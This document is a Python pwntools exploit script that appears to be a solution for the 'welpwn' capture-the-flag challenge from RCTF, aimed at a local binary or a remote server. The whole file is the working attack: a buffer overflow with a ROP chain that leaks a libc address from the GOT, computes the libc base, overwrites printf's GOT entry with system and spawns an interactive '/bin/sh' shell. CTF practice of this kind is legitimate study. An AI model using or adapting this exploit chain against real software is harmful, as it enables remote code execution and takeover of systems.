from pwn import *
import sys

if len(sys.argv) < 2:
	debug = True
else:
	debug = False

if debug:
	p = process("./welpwn")
	libc = ELF("/lib/x86_64-linux-gnu/libc-2.23.so")
	elf = ELF("./welpwn")
else:
	p = remote("111.198.29.45","45252")
	libc = ELF("./libc64-2.19.so")
	elf = ELF("./welpwn")

def debugf():
	if debug:
		gdb.attach(p,"b *0x00000000004007CC")

context.log_level = "debug"
context.terminal = ["tmux","splitw","-h"]
debugf()
p4 = 0x000000000040089c
rdi = 0x00000000004008a3
rsi2 = 0x00000000004008a1
payload = ""
payload += "a" * 0x18
payload += p64(p4)
payload += p64(rdi) + p64(elf.got["write"])
payload += p64(elf.plt["puts"])
payload += p64(rdi) + p64(0)
payload += p64(rsi2) + p64(elf.got["printf"]) + p64(0)
payload += p64(elf.plt["read"])
payload += p64(rdi) + p64(elf.got["printf"] + 8)
payload += p64(elf.plt["printf"])
p.sendafter("Welcome to RCTF\n",payload)
p.recvuntil("a" * 0x18)
p.recv(3)
leak_addr = u64(p.recvuntil("\n",drop = True).ljust(8,"\x00"))
libc.address = leak_addr - libc.symbols["write"]
log.success("libc_base:" + hex(libc.address))
payload = p64(libc.symbols["system"]) + "/bin/sh\x00"
p.send(payload)
p.interactive()
